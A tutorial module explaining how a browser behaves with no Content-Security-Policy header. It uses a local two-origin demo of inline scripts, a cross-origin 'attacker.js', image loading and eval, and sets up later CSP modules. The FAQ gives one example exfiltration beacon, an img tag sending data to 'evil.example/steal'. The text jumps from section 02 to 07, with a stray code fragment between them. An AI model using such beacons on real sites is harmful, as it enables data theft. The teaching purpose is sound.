01 — The Big Analogy

Imagine an apartment building with no front desk, no buzzer system, and no locks on any unit door. Anyone off the street can walk in, walk into any apartment, rearrange the furniture, and leave a note taped to your fridge. The building isn't "broken" — it was just never built with an access-control layer. It does exactly what buildings do (shelter, rooms, doors that open) — it simply has zero opinion about who's allowed to do what inside it.

That's a browser rendering a page with no Content-Security-Policy header. HTML parsing, script execution, image loading — every mechanism works exactly as designed. There's just no policy layer sitting on top saying "only scripts from here," or "no inline handlers." This module is the tour of the building before anyone installs a front desk.

02 — What Happens, Step by Step

  1. Browser requests http://localhost:5100/.
  2. Server responds 200 OK with an HTML body and ordinary headers — no Content-Security-Policy key anywhere.
  3. Browser parses the HTML top to bottom. It hits an inline <script> block and runs it immediately (Proof A).
  4. Browser hits <script src="http://localhost:5200/attacker.js">. It opens a new HTTP connection to port 5200 (a different origin), fetches the bytes, and executes them inside the same document it's still parsing (Proof B).
  5. Browser hits <img src="http://localhost:5200/pixel.png">, fetches it from the same different origin, decodes it, and paints it (Proof C).
  6. User clicks the button; the click handler calls eval('1 + 1'), which runs as JS and returns 2 (Proof D).

fs.readFile(filePath, (err, data) => {
  if (err) { /* ... */ }
  const ext = path.extname(filePath);

07 — Brain Exercise

Think it through before revealing

Proof B's script came from a different origin (port 5200) than the page that loaded it (port 5100). The Same-Origin Policy is specifically designed to stop cross-origin access. So why did attacker.js get to write directly into the port-5100 page's DOM without SOP stopping it?

Reveal the answer:

Because SOP restricts a script reading another origin's response data (e.g. fetch() can't read another origin's JSON without CORS headers) — it does not restrict loading and running a <script src> from another origin. Once the browser decides to execute those bytes, it executes them as if they were written directly into the including document. There is no sandbox boundary at all for `<script src>` execution — the origin only mattered for the network fetch, not for what the code is allowed to touch afterward. This is precisely the gap CSP's script-src directive (Module 3) exists to close.

08 — There Are No Dumb Questions

Q: Isn't "no CSP header" the same as "CSP: allow everything"?

Not quite the same framing, though the effect looks similar. There's no policy object being evaluated at all — the browser never asks "is this allowed?" It's not "yes" being returned; the question is never posed. That distinction matters starting Module 8, where you'll see how the browser combines multiple policies — a question that only makes sense once a policy exists to combine.

Q: Why does the image proof matter — isn't an XSS via script the "real" danger?

Images seem harmless, but the point of Proof C is narrower: it shows resource loading itself is origin-unrestricted by default. Later, img-src becomes one lever among many, and some real attacks (data exfiltration via image-beacon URLs, e.g. <img src="//evil.example/steal?data=...")) go through exactly this sink.

Q: Could I have proven all this with just one server instead of two?

You could prove Proofs A and D with one server. But Proofs B and C specifically need a second origin, and same-origin can't demonstrate a same-origin/cross-origin distinction — you'd just be showing same-origin loading works, which was never in doubt.

Q: Does `eval` in Proof D relate to CSP at all yet?

Not yet enforced by anything here — but keep the number in your head. Once Module 3 adds a script-src without 'unsafe-eval', this exact button will start throwing instead of returning 2, and you'll have this run to compare against.

Q: Why 68 bytes for the PNG — is that realistic?

No, and it's not supposed to be. It's the smallest byte sequence that is still a real, valid, decodable PNG — chosen so Proof C tests "did a real image byte-stream cross an origin and get painted," not "how fast is our test fixture."

09 — What's Next

Module 2 stays entirely inside a Node script, no browser required yet: you'll hand-write a parser that turns a raw Content-Security-Policy header string — the kind of string you just watched be absent — into a directive→source-list data structure. That parser is what Module 3 then uses to decide, for real, whether to actually send a blocking policy. Nothing in the browser changes yet; Module 2 is where the policy's shape gets nailed down before anything starts enforcing it.
